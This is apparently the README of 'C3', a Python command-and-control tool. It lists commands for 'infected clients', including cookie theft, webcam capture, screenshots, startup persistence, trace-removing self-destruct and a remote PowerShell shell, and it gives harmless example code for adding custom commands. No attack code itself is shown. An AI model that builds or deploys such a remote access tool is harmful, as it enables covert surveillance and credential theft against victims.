# C3
Customize, Command & Control.

## Why 'C3'?
Called it 'C3' because 'C2' is taken by [my previous attempt](https://github.com/objectiveSquid/C2) at a command and control server, which used HTTP requests in a web-gui. (also because this project is much more customizable)<br>
I started a new project because the old project gave me lung cancer from breathing in all of the shit code.

## Todo
  - Add Linux compatability to 'shell' command
  - Add all the TODO's integrated with comments in the code

## Commands
### Double commands (client and server side)
**kill_proc**: Kills a process on the client<br>
**launch_exe**: Launches an executable file on the client<br>
**invoke_bsod**: Invokes a BSOD on the client<br>
**show_image**: Displays an image on the clients screen<br>
**screenshot**: Captures a screenshot on client<br>
**typewrite**: Types a string on the clients keyboard<br>
**run_command**: Runs a command on the client<br>
**webcam_img**: Captures an image from the clients webcam<br>
**add_persistence**: Adds the client infection to PC startup<br>
**reboot**: Reboots the client PC<br>
**shutdown**: Turns off the client PC<br>
**self_destruct**: Self destructs and removes all trace of infection on the client side<br>
**steal_cookies**: Downloads cookies from the client<br>
**upload**: Uploads a file or folder to the client<br>
**download**: Downloads a file or folder from the client<br>
**open_url**: Opens a URL in a new webbrowser on the client<br>
**ls**: Lists items in a client side directory<br>
**mkdir**: Creates a directory on the client<br>
**rmdir**: Recursively removes a directory on the client<br>
**del**: Deletes a file on the client<br>
**touch**: Creates a file on the client<br>
**list_procs**: Lists the running processes on the client<br>
**chdir**: Changes the clients current working directory (CWD)<br>
**clipboard_set**: Sets the clipboard value on the client<br>
**clipboard_get**: Gets the clipboard value on the client<br>
**popup**: Displays a popup message on the clients screen<br>
**sysinfo**: Gathers information from the client computer<br>
**ipinfo**: Gets information about the client IP<br>
**shell**: Launches a powershell instance for interaction<br>
**playsound**: Plays a local sound file on the client<br>

### Local commands (no custom client client code)
**exit**: Removes all clients and exits<br>
**list_clients**: Lists your infected clients<br>
**remove_client**: Kills and removes a client<br>
**rename_client**: Renames a client<br>
**clear**: Clears the console<br>
**select**: Selects a client for command execution<br>
**deselect**: Deselects a client<br>
**help**: Displays help about command(s)<br>

## Add custom commands
External modules (such as `threading`, `random`, etc...) should be imported inside the function where they are used.<br>
### Double commands
Double commands should be implemented in the `shared/double_commands.py` file, since the required imports for creating a double command is already imported.
In an actual double command you would catch potential errors in the `server_side` and return them like this:<br>
`return CommandResult(DoubleCommandResult.your_error_here)`
Here is how you can implement a custom double command:<br>
```py3
@add_double_command(
    "my_double_command",
    "Usage [ required argument ] { optional argument }",
    "A cool double command!",
    argument_types=[
        ArgumentType.integer,
        ArgumentType.optional_string,
    ]
)
class MyDoubleCommand(DoubleCommand):
    @staticmethod
    def client_side(sock):
        data = sock.recv(512)
        print(data.decode())

    @staticmethod
    def server_side(client, params):
        client.socket.sendall(f"(required) Integer argument (1): {params[0]}\n".encode())
        if len(params) == 2:
            client.socket.sendall(f"(optional) String argument (2): {params[1]}\n".encode())

        return CommandResult(DoubleCommandResult.success)
```
### Local commands
Local commands should be implemented in the `server_extras/local_commands.py` file, since the required imports for creating a local command is already imported.
In an actual local command you would catch potential errors in the `local_side` and return them like this:<br>
`return CommandResult(LocalCommandResult.your_error_here)`
Here is how you can implement a custom local command:<br>
```py3
@add_local_command(
    "my_local_command",
    "Usage [ required argument ] { optional argument }",
    "A cool local command!",
    argument_types=[
        ArgumentType.integer,
        ArgumentType.optional_string,
    ]
)
class MyLocalCommand(LocalCommand):
    @staticmethod
    def local_side(server_thread, params):
        print(f"(required) Integer argument (1): {params[0]}")
        if len(params) == 2:
            print(f"(optional) String argument (2): {params[1]}")

        return CommandResult(LocalCommandResult.success)
```
